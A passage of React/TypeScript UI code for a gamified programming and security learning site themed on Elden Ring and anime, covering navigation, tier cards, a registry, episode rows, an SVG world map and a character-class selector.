                <AnimatePresence mode="wait">
                  <motion.div
                    key={loreIdx}
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    exit={{ opacity: 0 }}
                    transition={{ duration: 0.6 }}
                  >
                    <p style={{
                      fontFamily: "'Cinzel', serif",
                      fontSize: '0.42rem',
                      letterSpacing: '0.35em',
                      color: 'rgba(200,168,75,0.4)',
                      textTransform: 'uppercase',
                      marginBottom: '0.4rem',
                    }}>
                      {loreTexts[loreIdx].title}
                    </p>
                    <p style={{
                      fontFamily: "'Cormorant Garamond', serif",
                      fontSize: '0.7rem',
                      color: 'rgba(200,168,75,0.28)',
                      fontStyle: 'italic',
                      lineHeight: 1.7,
                    }}>
                      {loreTexts[loreIdx].body}
                    </p>
                  </motion.div>
                </AnimatePresence>

                {/* Grace site indicator */}
                <div className="flex items-center justify-end gap-3 mt-4">
                  <span style={{ color: '#C8A84B', opacity: 0.5, fontSize: '0.8rem', animation: 'er-pulse 3s infinite' }}>✦</span>
                  <span style={{
                    fontFamily: "'Cinzel', serif",
                    fontSize: '0.38rem',
                    letterSpacing: '0.4em',
                    color: 'rgba(200,168,75,0.3)',
                    textTransform: 'uppercase',
                  }}>
                    SITE OF GRACE NEARBY
                  </span>
                </div>
              </motion.div>
            </div>

            {/* Decorative bottom line */}
            <div className="absolute bottom-0 left-0 right-0 h-[2px]"
              style={{ background: 'linear-gradient(to right, transparent, rgba(200,168,75,0.3) 30%, rgba(200,168,75,0.3) 70%, transparent)' }}
            />
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

// ─────────────────────────────────────────────
// NAVIGATION
// ─────────────────────────────────────────────
const Navigation = ({ xp }: { xp: number }) => {
  const navigate = useNavigate();
  const location = useLocation();

  const navItems = [
    { id: 'HOME', path: '/' },
    { id: 'GRAND LINE', path: '/registry' },
    { id: 'BOUNTY BOARD', path: '/bounty' },
    { id: 'PIRATE LOG', path: '/profile' },
    { id: 'CLASS', path: '/class' },
  ];

  return (
    <nav className="fixed top-0 left-0 right-0 z-50 flex items-center h-20 px-8 border-b border-white/10 bg-black/95 backdrop-blur-lg">
      <div
        className="flex items-center cursor-pointer"
        onClick={() => navigate('/')}
        style={{ gap: '0.5rem' }}
      >
        <span style={{
          fontFamily: "'Cinzel', serif",
          fontSize: '1.1rem',
          fontWeight: 700,
          color: '#C8A84B',
          letterSpacing: '0.05em',
        }}>Ω</span>
        <span style={{
          fontFamily: "'Cinzel', serif",
          fontSize: '0.9rem',
          fontWeight: 700,
          color: 'white',
          letterSpacing: '0.2em',
          textTransform: 'uppercase',
        }}>EPHEMERAL</span>
      </div>

      <div className="hidden lg:flex gap-10 ml-16">
        {navItems.map((item) => (
          <button
            key={item.id}
            onClick={() => navigate(item.path)}
            className="transition-all"
            style={{
              fontFamily: "'Cinzel', serif",
              fontSize: '0.55rem',
              letterSpacing: '0.25em',
              textTransform: 'uppercase',
              fontWeight: 600,
              color: location.pathname === item.path ? '#C8A84B' : 'rgba(255,255,255,0.3)',
              background: 'none',
              border: 'none',
              cursor: 'pointer',
            }}
          >
            {item.id}
          </button>
        ))}
      </div>

      <div className="ml-auto flex items-center gap-6">
        <div className="hidden sm:flex items-center gap-3">
          <Zap className="w-3 h-3" style={{ color: '#C8A84B' }} />
          <span style={{
            fontFamily: "'IBM Plex Mono', monospace",
            fontSize: '0.65rem',
            fontWeight: 700,
            letterSpacing: '0.1em',
            color: '#C8A84B',
          }}>{xp.toLocaleString()} XP</span>
          <span style={{ color: 'rgba(255,255,255,0.15)', fontSize: '0.5rem' }}>·</span>
          <span style={{
            fontFamily: "'IBM Plex Mono', monospace",
            fontSize: '0.55rem',
            color: 'rgba(255,255,255,0.3)',
            letterSpacing: '0.08em',
          }}>RANK #14</span>
        </div>
        <div
          className="w-10 h-10 flex items-center justify-center cursor-pointer overflow-hidden relative"
          onClick={() => navigate('/profile')}
          style={{ border: '1px solid rgba(200,168,75,0.3)' }}
        >
          <img src={IMG.actage} className="absolute inset-0 w-full h-full object-cover opacity-60" alt=""
            onError={e => { (e.target as HTMLImageElement).style.display = 'none'; }}
          />
          <span style={{ fontFamily: "'Cinzel', serif", fontSize: '0.55rem', fontWeight: 700, color: '#C8A84B', position: 'relative', zIndex: 1 }}>AK</span>
        </div>
      </div>
    </nav>
  );
};

// ─────────────────────────────────────────────
// HOME ROUTE (domains + stats below hero)
// ─────────────────────────────────────────────
const HomeRoute = () => {
  const navigate = useNavigate();

  const TIER_LABELS: Record<number, { label: string; col: string }> = {
    0: { label: 'TIER 0 — TRAINING VILLAGE', col: '#22c55e' },
    1: { label: 'TIER 1 — THE ABYSS', col: '#c41230' },
    2: { label: 'TIER 2 — THE MEGASTRUCTURE', col: '#7c3aed' },
    3: { label: 'TIER 3 — THE GRAND LINE', col: '#00b4ff' },
    4: { label: 'TIER 4 — THE ORACLE', col: '#f5c518' },
    5: { label: 'TIER 5 — GHOST IN THE MACHINE', col: '#00e5c3' },
    6: { label: 'TIER 6 — THE ABSOLUTE RULESET', col: '#8b5cf6' },
    7: { label: 'TIER 7 — THE CANVAS', col: '#22d3ee' },
  };

  const tiers = Object.values(TIER_LABELS);
  const byTier = Object.values(DOMAINS).reduce<Record<number, Domain[]>>((acc, d) => {
    if (!acc[d.tier]) acc[d.tier] = [];
    acc[d.tier].push(d);
    return acc;
  }, {});

  return (
    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
      <EldenRingHero />

      {/* World Map Section */}
      <div className="bg-void px-16 pt-24 pb-16 max-w-7xl mx-auto">
        <div className="flex items-end gap-6 mb-16 border-b border-white/5 pb-10">
          <div>
            <h2 style={{ fontFamily: "'Cinzel', serif", fontSize: '2.5rem', letterSpacing: '0.1em', color: '#C8A84B', fontWeight: 700, lineHeight: 1 }}>
              WORLD MAP
            </h2>
            <p style={{ fontFamily: "'Cormorant Garamond', serif", fontStyle: 'italic', color: 'rgba(200,168,75,0.4)', fontSize: '0.85rem', marginTop: '0.3rem', letterSpacing: '0.1em' }}>
              Eight Tiers · Eight Trials · One Journey
            </p>
          </div>
          <button onClick={() => navigate('/registry')}
            className="ml-auto px-8 py-3 border border-white/10 text-white/40 text-xs font-mono uppercase tracking-widest hover:border-white/30 hover:text-white transition-all"
          >
            Full Registry →
          </button>
        </div>

        <div className="space-y-16">
          {tiers.map(({ label, col }, tierNum) => (
            <div key={tierNum}>
              {/* Tier header */}
              <div className="flex items-center gap-4 mb-8">
                <div className="w-2 h-2 rounded-full" style={{ background: col, boxShadow: `0 0 8px 2px ${col}60` }} />
                <h3 style={{
                  fontFamily: "'Cinzel', serif",
                  fontSize: '0.6rem',
                  letterSpacing: '0.4em',
                  color: col,
                  textTransform: 'uppercase',
                  fontWeight: 600,
                }}>
                  {label}
                </h3>
                <div className="flex-grow h-[1px]" style={{ background: `linear-gradient(to right, ${col}30, transparent)` }} />
              </div>

              {/* Domain cards for this tier */}
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
                {(byTier[tierNum] || []).map((d) => (
                  <motion.div
                    key={d.id}
                    whileHover={{ y: -4 }}
                    onClick={() => navigate(`/series/${d.id}`)}
                    className="group flex flex-col border bg-void-dark cursor-pointer relative overflow-hidden transition-all"
                    style={{ borderColor: 'rgba(255,255,255,0.06)' }}
                    onMouseEnter={e => (e.currentTarget.style.borderColor = d.col + '60')}
                    onMouseLeave={e => (e.currentTarget.style.borderColor = 'rgba(255,255,255,0.06)')}
                  >
                    {/* Cover image */}
                    <div className="h-36 overflow-hidden relative">
                      <img src={d.image} alt={d.name}
                        className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-700"
                        style={{ filter: 'grayscale(30%) brightness(50%)', mixBlendMode: 'screen', opacity: 0.8 }}
                        onError={e => { (e.target as HTMLImageElement).style.display = 'none'; }}
                      />
                      <div className="absolute inset-0" style={{ background: `linear-gradient(to top, #050505 0%, transparent 60%)` }} />
                      <div className="absolute inset-0" style={{ background: `radial-gradient(ellipse at bottom, ${d.col}15, transparent 70%)` }} />
                      {/* Tier badge */}
                      <div className="absolute top-3 left-3">
                        <span style={{
                          fontFamily: "'Cinzel', serif",
                          fontSize: '0.38rem',
                          letterSpacing: '0.35em',
                          color: d.col,
                          background: 'rgba(0,0,0,0.7)',
                          padding: '0.2rem 0.5rem',
                          border: `1px solid ${d.col}40`,
                          textTransform: 'uppercase',
                        }}>
                          TIER {d.tier}
                        </span>
                      </div>
                      {/* Progress */}
                      {d.prog > 0 && (
                        <div className="absolute top-3 right-3">
                          <span style={{
                            fontFamily: "'IBM Plex Mono', monospace",
                            fontSize: '0.5rem',
                            fontWeight: 700,
                            color: d.col,
                          }}>{d.prog}%</span>
                        </div>
                      )}
                    </div>

                    <div className="p-8 flex flex-col flex-grow">
                      <p style={{ fontFamily: "'IBM Plex Mono', monospace", fontSize: '0.45rem', color: 'rgba(255,255,255,0.3)', letterSpacing: '0.15em', textTransform: 'uppercase', marginBottom: '0.4rem' }}>
                        {d.manga}
                      </p>
                      <h3 style={{ fontFamily: "'Cinzel', serif", fontSize: '0.85rem', letterSpacing: '0.05em', fontWeight: 700, color: 'white', lineHeight: 1.2, textTransform: 'uppercase', marginBottom: '0.6rem' }}>
                        {d.name}
                      </h3>
                      <p style={{ fontFamily: "'Cormorant Garamond', serif", fontSize: '0.75rem', color: 'rgba(255,255,255,0.4)', lineHeight: 1.65, fontStyle: 'italic', flexGrow: 1 }}>
                        {d.desc.slice(0, 120)}...
                      </p>

                      <div className="flex justify-between items-center mt-6 pt-4 border-t border-white/5">
                        <div>
                          <div className="h-[2px] w-20 mb-1" style={{ background: 'rgba(255,255,255,0.07)' }}>
                            <div className="h-full" style={{ width: `${d.prog}%`, background: d.col }} />
                          </div>
                          <span style={{ fontFamily: "'IBM Plex Mono', monospace", fontSize: '0.42rem', color: 'rgba(255,255,255,0.3)', letterSpacing: '0.1em' }}>
                            {d.arcs} ARCS · {d.battles} BATTLES
                          </span>
                        </div>
                        <Play className="w-6 h-6" style={{ color: d.col, opacity: 0.5 }} />
                      </div>
                    </div>
                  </motion.div>
                ))}
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Stats band */}
      <div className="border-t border-white/5 bg-void-dark px-16 py-12">
        <div className="max-w-7xl mx-auto grid grid-cols-2 md:grid-cols-4 gap-8">
          {[
            { l: 'Total Tiers', v: '8', sub: 'From Syntax to Consensus' },
            { l: 'Active Battles', v: '100+', sub: 'CTF · Research · Quiz' },
            { l: 'Pirates Enrolled', v: '18,203', sub: 'Tarnished Coders Worldwide' },
            { l: 'Bounty Distributed', v: '¥47.2B', sub: 'XP Across All Arcs' },
          ].map(s => (
            <div key={s.l} className="flex flex-col gap-1">
              <span style={{ fontFamily: "'Cinzel', serif", fontSize: '0.4rem', letterSpacing: '0.4em', color: 'rgba(200,168,75,0.4)', textTransform: 'uppercase' }}>{s.l}</span>
              <span style={{ fontFamily: "'Cinzel', serif", fontSize: '2rem', fontWeight: 700, color: '#C8A84B', lineHeight: 1 }}>{s.v}</span>
              <span style={{ fontFamily: "'Cormorant Garamond', serif", fontSize: '0.7rem', color: 'rgba(255,255,255,0.3)', fontStyle: 'italic' }}>{s.sub}</span>
            </div>
          ))}
        </div>
      </div>
    </motion.div>
  );
};

// ─────────────────────────────────────────────
// REGISTRY VIEW
// ─────────────────────────────────────────────
const RegistryView = () => {
  const navigate = useNavigate();
  const [filter, setFilter] = useState('');
  const [tierFilter, setTierFilter] = useState<number | null>(null);

  const filtered = useMemo(() => Object.values(DOMAINS).filter(d => {
    const matchSearch = d.name.toLowerCase().includes(filter.toLowerCase()) ||
      d.manga.toLowerCase().includes(filter.toLowerCase()) ||
      d.cat.toLowerCase().includes(filter.toLowerCase());
    const matchTier = tierFilter === null || d.tier === tierFilter;
    return matchSearch && matchTier;
  }), [filter, tierFilter]);

  return (
    <div className="p-16 max-w-7xl mx-auto min-h-screen">
      <div className="mb-16">
        <h1 style={{ fontFamily: "'Cinzel', serif", fontSize: 'clamp(3rem,8vw,6rem)', fontWeight: 700, color: '#C8A84B', letterSpacing: '0.1em', lineHeight: 0.9 }}>
          DEVIL'S<br /><span style={{ color: 'white' }}>REGISTRY</span>
        </h1>
        <p style={{ fontFamily: "'Cormorant Garamond', serif", fontStyle: 'italic', color: 'rgba(200,168,75,0.4)', fontSize: '0.85rem', marginTop: '0.5rem', letterSpacing: '0.1em' }}>
          Public Safety Division · 8 Tiers · 100+ Battles
        </p>
      </div>

      {/* Filters */}
      <div className="flex flex-col md:flex-row gap-6 mb-12 border-y border-white/5 py-6">
        <div className="flex gap-3 flex-wrap">
          <button onClick={() => setTierFilter(null)}
            className="px-4 py-2 text-xs font-mono uppercase tracking-widest border transition-all"
            style={{ borderColor: tierFilter === null ? '#C8A84B' : 'rgba(255,255,255,0.1)', color: tierFilter === null ? '#C8A84B' : 'rgba(255,255,255,0.3)' }}
          >ALL TIERS</button>
          {[0,1,2,3,4,5,6,7].map(t => (
            <button key={t} onClick={() => setTierFilter(t)}
              className="px-3 py-2 text-xs font-mono uppercase tracking-widest border transition-all"
              style={{ borderColor: tierFilter === t ? '#C8A84B' : 'rgba(255,255,255,0.1)', color: tierFilter === t ? '#C8A84B' : 'rgba(255,255,255,0.3)' }}
            >T{t}</button>
          ))}
        </div>
        <div className="relative ml-auto w-full md:w-80">
          <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-white/20" />
          <input type="text" placeholder="Search registry..."
            className="w-full bg-void-dark border border-white/10 px-12 py-3 text-xs font-mono uppercase tracking-widest focus:outline-none focus:border-white/30 transition-all"
            value={filter} onChange={e => setFilter(e.target.value)}
          />
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8">
        {filtered.map(d => (
          <motion.div key={d.id} whileHover={{ y: -4 }}
            onClick={() => navigate(`/series/${d.id}`)}
            className="bg-void-dark border border-white/5 hover:border-white/20 p-8 cursor-pointer group flex flex-col relative overflow-hidden transition-all"
          >
            <div className="absolute inset-0 opacity-0 group-hover:opacity-20 transition-opacity">
              <img src={d.image} className="w-full h-full object-cover mix-blend-screen"
                onError={e => { (e.target as HTMLImageElement).style.display = 'none'; }} />
              <div className="absolute inset-0 bg-gradient-to-t from-void to-transparent" />
            </div>
            <div className="relative z-10">
              <div className="flex justify-between items-start mb-4">
                <span className="px-2 py-1 text-xs font-mono border" style={{ borderColor: d.col + '40', color: d.col, fontSize: '0.4rem', letterSpacing: '0.3em' }}>
                  TIER {d.tier}
                </span>
                <span className="text-xs font-mono font-bold" style={{ color: d.col }}>{d.prog}%</span>
              </div>
              <div className="text-3xl mb-4">{d.icon}</div>
              <p className="text-xs font-mono text-white/30 uppercase tracking-widest mb-2">{d.manga}</p>
              <h3 className="font-black text-lg uppercase tracking-tight leading-tight mb-3" style={{ fontFamily: "'Cinzel', serif", fontSize: '0.85rem', color: 'white' }}>
                {d.name}
              </h3>
              <div className="flex justify-between items-center text-xs font-mono text-white/30 border-t border-white/5 pt-4 mt-auto">
                <span>{d.arcs} ARCS</span>
                <span style={{ color: d.col }}>{d.battles} BATTLES</span>
              </div>
            </div>
          </motion.div>
        ))}
      </div>
    </div>
  );
};

// ─────────────────────────────────────────────
// EPISODE ROW
// ─────────────────────────────────────────────
const EpisodeRow: React.FC<{ ep: Episode; domain: Domain; onClick: () => void }> = ({ ep, domain, onClick }) => (
  <motion.div
    whileHover={{ x: 8 }}
    onClick={ep.locked ? undefined : onClick}
    className={`group flex items-center gap-6 p-8 border border-white/5 bg-void-dark transition-all relative overflow-hidden cursor-pointer
      ${ep.done ? 'border-l-4' : ''}
      ${ep.locked ? 'opacity-20 cursor-not-allowed' : 'hover:border-white/20 hover:bg-white/5'}`}
    style={{ borderLeftColor: ep.done ? domain.col : undefined }}
  >
    <div className="flex-shrink-0 text-5xl font-black italic opacity-5 leading-none w-16">
      {ep.n < 10 ? `0${ep.n}` : ep.n}
    </div>
    <div className="flex-grow min-w-0">
      <div className="flex items-center gap-3 mb-2 flex-wrap">
        <span className="px-2 py-0.5 text-xs font-mono font-bold uppercase tracking-widest border"
          style={{
            borderColor: ep.type === 'ctf' ? '#FF4D00' : ep.type === 'research' ? '#8b5cf6' : '#00e5c3',
            color: ep.type === 'ctf' ? '#FF4D00' : ep.type === 'research' ? '#8b5cf6' : '#00e5c3',
            fontSize: '0.45rem',
          }}>
          {ep.type === 'ctf' ? 'GAUNTLET' : ep.type === 'research' ? 'SCROLL' : 'QUIZ'}
        </span>
        {ep.active && <span className="px-2 py-0.5 text-xs font-mono font-bold uppercase bg-red-600 text-white" style={{ fontSize: '0.4rem', letterSpacing: '0.2em' }}>ACTIVE</span>}
        {ep.done && <span style={{ color: domain.col, fontFamily: "'IBM Plex Mono', monospace", fontSize: '0.5rem', fontWeight: 700 }}>✓ CLEARED</span>}
      </div>
      <h3 className="text-xl font-black uppercase tracking-tight group-hover:text-white/80 transition-colors mb-1 leading-tight" style={{ fontFamily: "'Cinzel', serif", fontSize: '0.9rem' }}>
        {ep.t}
      </h3>
      <p className="text-xs text-white/30 uppercase tracking-wide leading-relaxed">{ep.d.slice(0, 140)}...</p>
      <div className="flex gap-4 mt-2" style={{ fontFamily: "'IBM Plex Mono', monospace", fontSize: '0.5rem', color: 'rgba(255,255,255,0.2)' }}>
        <span>⏱ {ep.min} min</span>
        <span style={{ color: domain.col }}>⚡ +{ep.xp} XP</span>
        {ep.locked && <span>🔒 Clear previous first</span>}
      </div>
    </div>
    <div className="text-3xl opacity-10 group-hover:opacity-50 transition-all">{ep.ic}</div>
  </motion.div>
);

// ─────────────────────────────────────────────
// SVG WORLD MAP — 8 tier node graph
// ─────────────────────────────────────────────
const WorldMap = ({ onSelectTier }: { onSelectTier: (id: string) => void }) => {
  const [hovered, setHovered] = useState<string | null>(null);

  // Node positions (x,y) in a 900×500 viewBox — roughly Elden Ring's map flow
  const nodes: { id: string; x: number; y: number; tier: number; label: string; col: string; prog: number }[] = [
    { id:'t0_village',       x:80,  y:400, tier:0, label:'TRAINING\nVILLAGE',    col:'#22c55e', prog:85 },
    { id:'t1_abyss',         x:200, y:340, tier:1, label:'THE\nABYSS',           col:'#c41230', prog:42 },
    { id:'t2_megastructure', x:340, y:260, tier:2, label:'MEGA-\nSTRUCTURE',     col:'#7c3aed', prog:20 },
    { id:'t3_grandline',     x:460, y:380, tier:3, label:'GRAND\nLINE',          col:'#00b4ff', prog:30 },
    { id:'t4_oracle',        x:580, y:200, tier:4, label:'THE\nORACLE',          col:'#f5c518', prog:68 },
    { id:'t5_ghost',         x:680, y:310, tier:5, label:'GHOST IN\nMACHINE',    col:'#00e5c3', prog:15 },
    { id:'t6_ruleset',       x:780, y:220, tier:6, label:'ABSOLUTE\nRULESET',    col:'#8b5cf6', prog:5  },
    { id:'t7_canvas',        x:860, y:120, tier:7, label:'THE\nCANVAS',          col:'#22d3ee', prog:50 },
  ];

  // Edges connecting tiers
  const edges = [
    ['t0_village','t1_abyss'],
    ['t1_abyss','t2_megastructure'],
    ['t1_abyss','t3_grandline'],
    ['t2_megastructure','t4_oracle'],
    ['t3_grandline','t4_oracle'],
    ['t3_grandline','t5_ghost'],
    ['t4_oracle','t6_ruleset'],
    ['t5_ghost','t6_ruleset'],
    ['t6_ruleset','t7_canvas'],
  ];

  const getNode = (id: string) => nodes.find(n => n.id === id)!;

  return (
    <div className="relative w-full" style={{ background: '#080604', border: '1px solid rgba(200,168,75,0.1)' }}>
      {/* Header */}
      <div className="px-8 py-5 border-b flex items-center justify-between" style={{ borderColor: 'rgba(200,168,75,0.1)' }}>
        <h3 style={{ fontFamily:"'Cinzel',serif", fontSize:'0.65rem', letterSpacing:'0.4em', color:'#C8A84B', textTransform:'uppercase' }}>
          ✦ World Map — Tarnished's Path
        </h3>
        <span style={{ fontFamily:"'IBM Plex Mono',monospace", fontSize:'0.45rem', color:'rgba(200,168,75,0.3)', letterSpacing:'0.2em' }}>
          {nodes.filter(n=>n.prog>0).length} / {nodes.length} TIERS ENTERED
        </span>
      </div>

      <svg viewBox="0 0 960 520" className="w-full" style={{ height: 'clamp(260px, 35vw, 460px)' }}>
        {/* Fog overlay at top */}
        <defs>
          <radialGradient id="nodeGlow" cx="50%" cy="50%" r="50%">
            <stop offset="0%" stopColor="rgba(200,168,75,0.5)" />
            <stop offset="100%" stopColor="rgba(200,168,75,0)" />
          </radialGradient>
          <filter id="blur-sm"><feGaussianBlur stdDeviation="3"/></filter>
          <filter id="blur-lg"><feGaussianBlur stdDeviation="8"/></filter>
        </defs>

        {/* Background parchment texture lines */}
        {Array.from({length:18},(_,i)=>(
          <line key={i} x1="0" y1={i*30} x2="960" y2={i*30+15}
            stroke="rgba(200,168,75,0.03)" strokeWidth="1" />
        ))}

        {/* Edges */}
        {edges.map(([a,b]) => {
          const na = getNode(a), nb = getNode(b);
          const unlocked = na.prog > 0;
          const midX = (na.x + nb.x) / 2;
          const midY = (na.y + nb.y) / 2 - 20;
          return (
            <g key={`${a}-${b}`}>
              {/* Glow behind path */}
              {unlocked && (
                <path d={`M ${na.x} ${na.y} Q ${midX} ${midY} ${nb.x} ${nb.y}`}
                  stroke={na.col} strokeWidth="6" fill="none" opacity="0.08" filter="url(#blur-lg)" />
              )}
              <path d={`M ${na.x} ${na.y} Q ${midX} ${midY} ${nb.x} ${nb.y}`}
                stroke={unlocked ? na.col : 'rgba(200,168,75,0.1)'}
                strokeWidth={unlocked ? 1.5 : 1}
                fill="none"
                strokeDasharray={unlocked ? 'none' : '4 6'}
                opacity={unlocked ? 0.5 : 0.3}
              />
              {/* Travel dot on unlocked paths */}
              {unlocked && (
                <circle r="3" fill={na.col} opacity="0.7">
                  <animateMotion dur={`${4 + Math.random()*4}s`} repeatCount="indefinite">
                    <mpath href={`#path-${a}-${b}`} />
                  </animateMotion>
                </circle>
              )}
            </g>
          );
        })}

        {/* Nodes */}
        {nodes.map(n => {
          const isHovered = hovered === n.id;
          const isActive = n.prog > 0;
          const r = isHovered ? 22 : 18;
          return (
            <g key={n.id}
              style={{ cursor:'pointer' }}
              onClick={() => onSelectTier(n.id)}
              onMouseEnter={() => setHovered(n.id)}
              onMouseLeave={() => setHovered(null)}
            >
              {/* Outer glow ring */}
              {isActive && (
                <circle cx={n.x} cy={n.y} r={r+14}
                  fill="none" stroke={n.col} strokeWidth="1" opacity="0.15"
                  filter="url(#blur-sm)" />
              )}
              {/* Progress arc */}
              {isActive && (() => {
                const pct = n.prog / 100;
                const circ = 2 * Math.PI * (r+8);
                return (
                  <circle cx={n.x} cy={n.y} r={r+8}
                    fill="none" stroke={n.col} strokeWidth="1.5"
                    strokeDasharray={`${pct*circ} ${circ}`}
                    strokeDashoffset={circ*0.25}
                    opacity="0.6" transform={`rotate(-90 ${n.x} ${n.y})`}
                  />
                );
              })()}
              {/* Node body */}
              <circle cx={n.x} cy={n.y} r={r}
                fill={isActive ? `${n.col}18` : 'rgba(20,16,8,0.9)'}
                stroke={isHovered ? n.col : isActive ? `${n.col}60` : 'rgba(200,168,75,0.15)'}
                strokeWidth={isHovered ? 2 : 1}
              />
              {/* Tier number */}
              <text x={n.x} y={n.y+1} textAnchor="middle" dominantBaseline="middle"
                style={{ fontFamily:"'Cinzel',serif", fontSize:isHovered?'14px':'12px',
                  fontWeight:700, fill: isActive ? n.col : 'rgba(200,168,75,0.3)',
                  transition:'all 0.2s' }}>
                T{n.tier}
              </text>
              {/* Label */}
              {(isHovered || isActive) && n.label.split('\n').map((line,li) => (
                <text key={li} x={n.x} y={n.y + r + 14 + li*13}
                  textAnchor="middle"
                  style={{ fontFamily:"'IBM Plex Mono',monospace", fontSize:'8px',
                    fill: isHovered ? n.col : 'rgba(200,168,75,0.45)',
                    letterSpacing:'0.1em', textTransform:'uppercase' }}>
                  {line}
                </text>
              ))}
              {/* Grace indicator for completed */}
              {n.prog >= 80 && (
                <text x={n.x+r-4} y={n.y-r+4} style={{ fontSize:'8px' }}>✦</text>
              )}
            </g>
          );
        })}

        {/* YOU ARE HERE marker */}
        {(() => {
          const cur = nodes.find(n => n.id === 't1_abyss');
          if (!cur) return null;
          return (
            <g>
              <polygon points={`${cur.x},${cur.y-36} ${cur.x-6},${cur.y-48} ${cur.x+6},${cur.y-48}`}
                fill="#C8A84B" opacity="0.9" />
              <text x={cur.x} y={cur.y-55} textAnchor="middle"
                style={{ fontFamily:"'Cinzel',serif", fontSize:'6px', fill:'#C8A84B',
                  letterSpacing:'0.2em', textTransform:'uppercase' }}>
                LAST GRACE
              </text>
            </g>
          );
        })()}
      </svg>

      {/* Legend */}
      <div className="px-8 py-4 border-t flex gap-8" style={{ borderColor:'rgba(200,168,75,0.08)' }}>
        {[
          { label:'Entered', col:'#C8A84B', dash:false },
          { label:'Locked', col:'rgba(200,168,75,0.2)', dash:true },
          { label:'Last Grace', col:'#C8A84B', icon:'✦' },
        ].map(l => (
          <div key={l.label} className="flex items-center gap-2">
            {l.icon
              ? <span style={{ color:'#C8A84B', fontSize:'0.6rem' }}>{l.icon}</span>
              : <div className="w-6 h-[1px]" style={{ background:l.col, border: l.dash ? `1px dashed ${l.col}` : 'none' }} />
            }
            <span style={{ fontFamily:"'IBM Plex Mono',monospace", fontSize:'0.4rem', color:'rgba(200,168,75,0.35)', letterSpacing:'0.2em', textTransform:'uppercase' }}>
              {l.label}
            </span>
          </div>
        ))}
      </div>
    </div>
  );
};

// ─────────────────────────────────────────────
// CHARACTER CLASS SELECTOR (onboarding)
// ─────────────────────────────────────────────
interface CharClass {
  id: string; name: string; epithet: string;
  startTier: string; desc: string; manga: string;
  stats: { label: string; val: number }[];
  col: string; img: string; icon: string;
}

const CHAR_CLASSES: CharClass[] = [
  {
    id:'wretch', name:'THE WRETCH', epithet:'Begun anew, naked as the day you were born',
    startTier:'t0_village', col:'#C8A84B',
    manga:'One Punch Man — Saitama', img:IMG.opm, icon:'💪',
    desc:"No prior knowledge assumed. Start from absolute zero — syntax, variables, loops. Saitama's path: boring, repetitive, and the only one that works.",
    stats:[{label:'Difficulty',val:3},{label:'Breadth',val:5},{label:'Depth',val:4},{label:'Grind',val:5}],
  },
  {
    id:'samurai', name:'THE BLADE BEARER', epithet:'Honed edge of the low-level arts',
    startTier:'t1_abyss', col:'#c41230',
    manga:'Berserk — Guts', img:IMG.berserk, icon:'⚔️',
    desc:"You know syntax. Now forge the weapon — C memory, pointer arithmetic, buffer overflows. Guts forged the Dragon Slayer from raw iron. You will forge the same discipline from raw bytes.",
    stats:[{label:'Difficulty',val:5},{label:'Breadth',val:3},{label:'Depth',val:5},{label:'Grind',val:4}],
  },
  {
    id:'navigator', name:'THE NAVIGATOR', epithet:'Charts the currents no one else can read',
    startTier:'t3_grandline', col:'#00b4ff',
    manga:'One Piece — Nami', img:IMG.onepiece, icon:'🧭',
    desc:"You know how computers work. Time to navigate the ocean — web security, HTTP interception, SQL injection. The Grand Line rewards those who chart before they sail.",
    stats:[{label:'Difficulty',val:3},{label:'Breadth',val:5},{label:'Depth',val:3},{label:'Grind',val:3}],
  },
  {
    id:'prophet', name:'THE PROPHET', epithet:'Sees the pattern before it completes',
    startTier:'t4_oracle', col:'#f5c518',
    manga:'Monster — Johann Liebert', img:IMG.monster, icon:'🧠',
    desc:"The deep learning path. Build neural networks from scratch, implement Transformers, execute adversarial attacks. Johann predicted every move — you will build the models that do the same.",
    stats:[{label:'Difficulty',val:5},{label:'Breadth',val:4},{label:'Depth',val:5},{label:'Grind',val:4}],
  },
  {
    id:'vagabond', name:'THE VAGABOND', epithet:'Wanders freely. Locks down everything else',
    startTier:'t6_ruleset', col:'#8b5cf6',
    manga:'DARK — Jonas Kahnwald', img:IMG.dark, icon:'∞',
    desc:"Distributed systems, consensus, real-time sync. Jonas spent decades untangling the Knot — you will untangle the CAP theorem, implement Raft, and deliver perfect sync across partitioned nodes.",
    stats:[{label:'Difficulty',val:5},{label:'Breadth',val:4},{label:'Depth',val:5},{label:'Grind',val:3}],
  },
  {
    id:'artist', name:'THE ARTIST', epithet:'Makes the invisible visible',
    startTier:'t7_canvas', col:'#22d3ee',
    manga:'Blue Period — Yatora Yaguchi', img:IMG.blueperiod, icon:'🎨',
    desc:"Performance, CSS artistry, WebAssembly, WebGL shaders. Yatora painted what no one else could see — your canvas is the browser, and the judges evaluate you purely on what the viewer feels.",
    stats:[{label:'Difficulty',val:4},{label:'Breadth',val:4},{label:'Depth',val:4},{label:'Grind',val:2}],
  },
];

const CharacterClassRoute = ({ onSelect }: { onSelect: (cls: CharClass) => void }) => {
  const [idx, setIdx] = useState(0);
  const [confirmed, setConfirmed] = useState(false);
  const cls = CHAR_CLASSES[idx];

  useEffect(() => {
    const handler = (e: KeyboardEvent) => {
      if (e.key === 'ArrowLeft')  setIdx(i => (i - 1 + CHAR_CLASSES.length) % CHAR_CLASSES.length);
      if (e.key === 'ArrowRight') setIdx(i => (i + 1) % CHAR_CLASSES.length);
      if (e.key === 'Enter' && !confirmed) { setConfirmed(true); setTimeout(() => onSelect(cls), 1200); }
    };
    window.addEventListener('keydown', handler);
    return () => window.removeEventListener('keydown', handler);
  }, [idx, cls, confirmed]);

  return (
    <div className="min-h-screen flex flex-col items-center justify-center relative overflow-hidden"
      style={{ background:'#050402' }}>
      <EmberParticles />

      {/* Background art */}
      <div className="absolute inset-0 z-0">
        <AnimatePresence mode="wait">
          <motion.img key={cls.id} src={cls.img} alt=""
            initial={{ opacity:0, scale:1.05 }} animate={{ opacity:0.12, scale:1 }} exit={{ opacity:0 }}
            transition={{ duration:0.6 }}
            className="absolute inset-0 w-full h-full object-cover"
            style={{ filter:'sepia(60%) contrast(120%) brightness(40%)', mixBlendMode:'screen' }}
